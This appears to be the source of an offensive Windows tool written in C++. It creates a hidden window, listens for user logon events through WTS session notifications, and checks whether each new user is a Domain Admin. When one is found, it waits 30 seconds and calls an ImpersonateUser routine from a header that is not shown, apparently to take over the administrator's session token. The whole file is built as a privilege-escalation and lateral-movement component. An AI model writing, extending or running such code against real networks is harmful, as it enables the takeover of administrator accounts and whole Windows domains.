#include <windows.h>
#include "impersonate.h"
#include <wtsapi32.h>
#include <iostream>
#pragma comment(lib, "wtsapi32.lib")



LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_WTSSESSION_CHANGE) {
        if (wParam == WTS_SESSION_LOGON) { // New user logged in
            std::cout << "A new user has logged in!" << std::endl;
            DWORD sessionId = static_cast<DWORD>(lParam);
            LPWSTR username = NULL;
            DWORD bytesReturned = 0;

            if (WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSUserName, &username, &bytesReturned)) {
                std::wcout << L"User logged in: " << username << std::endl;
                std::wcout << L"Cheking permissions..." << std::endl;
                
                if (CheckPermissions(username))
                {
                    std::wcout << L"User is a Domain Admin!" << username << std::endl;
                    Sleep(30000);
                    int errorcode = ImpersonateUser(username);
                }
                else
                {
                    std::wcout << L"User is not a Domain Admin!" << username << std::endl;
                }
                
            }
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void MonitorUserLogins() {
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"HiddenWindowClass";

    if (!RegisterClass(&wc)) {
        std::cerr << "Failed to register window class!" << std::endl;
        return;
    }

    HWND hwnd = CreateWindow(L"HiddenWindowClass", L"HiddenWindow", 0, 0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);
    if (!hwnd) {
        std::cerr << "Failed to create hidden window!" << std::endl;
        return;
    }

    WTSRegisterSessionNotification(hwnd, NOTIFY_FOR_ALL_SESSIONS);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

    }

    WTSUnRegisterSessionNotification(hwnd);
    DestroyWindow(hwnd);
}

int main() {
    std::cout << "Monitoring user logins..." << std::endl;
    MonitorUserLogins();
    return 0;
}
